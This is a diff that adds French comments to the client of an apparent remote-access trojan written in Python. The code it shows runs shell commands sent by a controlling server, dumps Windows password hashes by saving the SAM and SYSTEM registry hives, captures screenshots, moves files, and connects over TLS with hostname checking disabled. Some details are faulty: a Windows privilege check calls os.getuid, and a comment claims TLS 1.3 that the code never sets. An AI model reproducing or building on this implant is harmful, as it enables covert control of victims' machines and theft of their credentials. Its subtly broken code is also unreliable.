@@ -8,8 +8,10 @@ import os
 import io
 import sys
 
+# Ajout du répertoire parent au chemin système pour trouver les modules utilitaires
 sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
 
+# Importation des modules utilitaires
 from utils.system_info import SystemInfo
 from utils.file_upload import FileUpload
 from utils.file_download import FileDownload
@@ -17,6 +19,7 @@ from utils.file_search import FileSearch
 from utils.network_info import NetworkInfo
 from utils.command_help import CommandHelp
 
+# Importation de pyscreenshot pour la capture d'écran
 try:
     import pyscreenshot
 except ImportError:
@@ -24,6 +27,7 @@ except ImportError:
     sys.exit(1)
 
 def check_privileges():
+    # Vérification des privilèges administratifs
     if os.name == 'nt':
         try:
             is_admin = os.getuid() == 0
@@ -42,12 +46,14 @@ class CLIENT:
         self.port = port
 
     def send_data(self, data, encode=True):
+        # Envoi des données au serveur, avec ou sans encodage en base64
         if encode:
             self.SOCK.sendall(base64.b64encode(data.encode('utf-8')))
         else:
             self.SOCK.sendall(base64.b64encode(data))
 
     def execute(self, command):
+        # Exécution des commandes reçues du serveur
         data = command.decode('utf-8').split(" ", 1)
         if data[0] == "shell":
             try:
@@ -89,6 +95,7 @@ class CLIENT:
             self.send_data(result)
 
     def hashdump(self):
+        # Récupération des hachages de mots de passe
         if os.name == 'nt':
             try:
                 result = subprocess.check_output("reg save HKLM\\SAM sam && reg save HKLM\\SYSTEM system", shell=True)
@@ -104,6 +111,7 @@ class CLIENT:
                 self.send_data(f"Error: {str(e)}")
 
     def acceptor(self):
+        # Réception des commandes du serveur et exécution
         while True:
             try:
                 command = base64.b64decode(self.SOCK.recv(4096)).decode('utf-8')
@@ -114,6 +122,7 @@ class CLIENT:
                 break
 
     def engage(self):
+        # Création d'un contexte SSL avec le protocole TLS v1.3
         context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
         context.check_hostname = False
         context.load_verify_locations(cafile="../certificate/server.crt")
